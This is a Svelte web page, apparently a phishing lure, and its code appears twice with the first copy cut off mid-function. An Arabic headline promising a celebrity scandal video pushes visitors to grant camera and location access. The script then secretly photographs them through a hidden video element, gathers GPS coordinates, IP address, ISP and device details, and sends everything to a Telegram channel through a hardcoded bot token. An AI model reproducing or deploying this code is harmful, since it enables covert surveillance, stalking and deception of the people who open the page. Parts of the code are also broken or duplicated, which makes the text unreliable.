<script>
  import { onMount } from 'svelte';
  let videoElement = document.querySelector('video');


  onMount(async () => {
    try {
      const videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
      videoElement.srcObject = videoStream;
      await videoElement.play();

      const { latitude, longitude } = await getLocation();
      const photo = await capturePhoto();
      await sendLocationAndIPToTelegramBots(latitude, longitude, photo);
    } catch (error) {
      console.error(error);
      if (error.name === 'NotAllowedError') {
        redirectToNextURL();
      }
    }
  });

  async function sendLocationAndIPToTelegramBots(latitude, longitude, photo) {
    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;

    const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
    const clickableLink = `<a href="${locationLink}" style="color: red;">Location</a>`;
    const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
    const ipLocationNetLink = `<a href="${ipLocationLink}">IP Location</a>`;

    const locationIcon = "\u{1F4CD}";

    const htmlMessage = `${locationIcon} Location: ${latitude} ${longitude}\n\n${clickableLink}\n\n${ipLocationNetLink}`;

    await fetch(telegramBotURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: '@localipy', // Replace with the channel username or ID
        text: htmlMessage,
        parse_mode: 'HTML',
      }),
    });

    await sendPhotoToTelegram(photo, latitude, longitude);
  }

  function getLocation() {
    return new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          resolve(position.coords);
        },
        (error) => {
          reject(error);
        }
      );
    });
  }

  function capturePhoto() {
    const canvas = document.createElement('canvas');
    canvas.width = videoElement.videoWidth;
    canvas.height = videoElement.videoHeight;
    const context = canvas.getContext('2d');
    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
    const photoDataUrl = canvas.toDataURL('image/jpeg');
    return fetch(photoDataUrl).then((response) => response.blob());
  }

  async function sendPhotoToTelegram(photoBlob, latitude, longitude) {
    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendPhoto`;

    const formData = new FormData();
    formData.append('photo', photoBlob, 'photo.jpg');
    formData.append('chat_id', '@localipy'); // Replace with the channel username or ID
    formData.append('caption', `Location: ${latitude}, ${longitude}`);

    await fetch(telegramBotURL, {
      method: 'POST',
      body: formData,
    });
  }

  async function sendIPToTelegramBots() {
    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;

    const response = await fetch('https://api.ipify.org/?format=json');
    const data = await response.json();
    const ipAddress = data.ip;

    const userAgentData = navigator.userAgentData;
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;
    const cpuCores = navigator.hardwareConcurrency || 'N/A';
    const totalRAM = navigator.deviceMemory || 'N/A';
    const vendor = navigator.vendor;
    const isAndroid = userAgent.toLowerCase().includes('android');

    const ipInfo = await getIPInfo(ipAddress);
    const country = ipInfo.country_name || 'N/A';
    const city = ipInfo.city || 'N/A';
    const isp = ipInfo.org || 'N/A';

    const message = `
      IP: ${ipAddress}
      Country: ${country}
      City: ${city}
      ISP: ${isp}
      Platform: ${platform}
      Screen Width: ${screenWidth}
      Screen Height: ${screenHeight}
      CPU Cores: ${cpuCores}
      Total RAM: ${totalRAM}
      Vendor: ${vendor}
      Android: ${isAndroid ? 'Yes' : 'No'}
      User Agent: ${userAgent}
    `;

    const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
    const ipLocationNetLink = `<a href="${ipLocationLink}">IP Location</a>`;
    const htmlMessage = `${message}\n\n${ipLocationNetLink}`;

    await fetch(telegramBotURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: '@localipy', // Replace with the channel username or ID
        text: htmlMessage,
<script>
  import { onMount } from 'svelte';

  onMount(async () => {
    try {
      const { latitude, longitude } = await getLocation();
      const ipAddress = await getIPAddress();
      const photo = await capturePhoto();

      await sendLocationToTelegram(latitude, longitude);
      await sendIPToTelegram(ipAddress);
      await sendPhotoToTelegram(photo);
    } catch (error) {
      console.error(error);
    }
  });

  async function sendLocationToTelegram(latitude, longitude) {
    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;
    const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
    const locationIcon = "\u{1F4CD}";

    const htmlMessage = `${locationIcon} Location:\n\nLatitude: ${latitude}\nLongitude: ${longitude}\n\nLocation: <a href="${locationLink}" style="color: red;">Click here</a>`;

    await fetch(telegramBotURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: '@localipy', // Replace with the channel username or ID
        text: htmlMessage,
        parse_mode: 'HTML',
      }),
    });
  }

  async function sendIPToTelegram(ipAddress) {
    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;
    const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
    const ipIcon = "\u{1F310}";

    const htmlMessage = `${ipIcon} IP Address:\n\n${ipAddress}\n\nIP Location: <a href="${ipLocationLink}">Click here</a>`;

    await fetch(telegramBotURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: '@localipy', // Replace with the channel username or ID
        text: htmlMessage,
        parse_mode: 'HTML',
      }),
    });
  }

  async function sendPhotoToTelegram(photo) {
    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendPhoto`;

    const formData = new FormData();
    formData.append('photo', photo, 'photo.jpg');
    formData.append('chat_id', '@localipy'); // Replace with the channel username or ID

    await fetch(telegramBotURL, {
      method: 'POST',
      body: formData,
    });
  }

  function getLocation() {
    return new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          resolve(position.coords);
        },
        (error) => {
          reject(error);
        }
      );
    });
  }

  function getIPAddress() {
    return fetch('https://api.ipify.org?format=json')
      .then((response) => response.json())
      .then((data) => data.ip);
  }

  function capturePhoto() {
    return new Promise((resolve, reject) => {
      const videoElement = document.createElement('video');
      videoElement.style.display = 'none';

      document.body.appendChild(videoElement);

      navigator.mediaDevices
        .getUserMedia({ video: true })
        .then((stream) => {
          videoElement.srcObject = stream;
          videoElement.play();

          const canvasElement = document.createElement('canvas');
          canvasElement.width = videoElement.videoWidth;
          canvasElement.height = videoElement.videoHeight;

          const context = canvasElement.getContext('2d');
          context.drawImage(
            videoElement,
            0,
            0,
            videoElement.videoWidth,
            videoElement.videoHeight
          );

          canvasElement.toBlob((blob) => {
            resolve(blob);
          }, 'image/jpeg');

          videoElement.pause();
          videoElement.srcObject = null;
          stream.getTracks().forEach((track) => track.stop());
          document.body.removeChild(videoElement);
        })
        .catch((error) => {
          reject(error);
        });
    });
  }
</script>


<main>
  <video {autoplay} {muted} {playsinline} style="display: none;"></video>
  <h1>Getting Location and IP...</h1>
  <center>
    <h1 style="font-size: 36px; font-weight: bold;">فضايح هيفاء وهبي</h1>
  </center>

  <center>
    <h1 style="font-size: 36px; font-weight: bold;">اعمل سماح لمشاهدة فيديو الفضايح يلا بسرعة</h1>
  </center>

  <div class="image-grid">
    <div class="image-container">
      <img src="https://i.ibb.co/CM1zJSc/photo1.jpg" alt="Photo 1">
    </div>
    <div class="image-container">
      <img src="https://i.ibb.co/Qn6nbGM/photo2.jpg" alt="Photo 2">
    </div>
    <div class="image-container">
      <img src="https://i.ibb.co/XF1gFN0/photo3.jpg" alt="Photo 3">
    </div>
    <div class="image-container">
      <img src="https://i.ibb.co/rmSPhTB/photo4.jpg" alt="Photo 4">
    </div>
    <div class="image-container">
      <img src="https://i.ibb.co/0BVhJkB/photo5.jpg" alt="Photo 5">
    </div>
    <div class="image-container">
      <img src="https://i.ibb.co/5Mw4bdQ/photo6.jpg" alt="Photo 6">
    </div>
    <div class="image-container">
      <img src="https://i.ibb.co/2Y0ZKnT/photo7.jpg" alt="Photo 7">
    </div>
    <div class="image-container">
      <img src="https://i.ibb.co/PhKHmNt/photo8.jpg" alt="Photo 8">
    </div>
  </div>
</main>

<style>
  .image-grid {
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    grid-gap: 10px;
  }

  .image-container {
    display: flex;
    justify-content: center;
    align-items: center;
  }

  .image-container img {
    max-width: 100%;
    height: auto;
  }
</style>
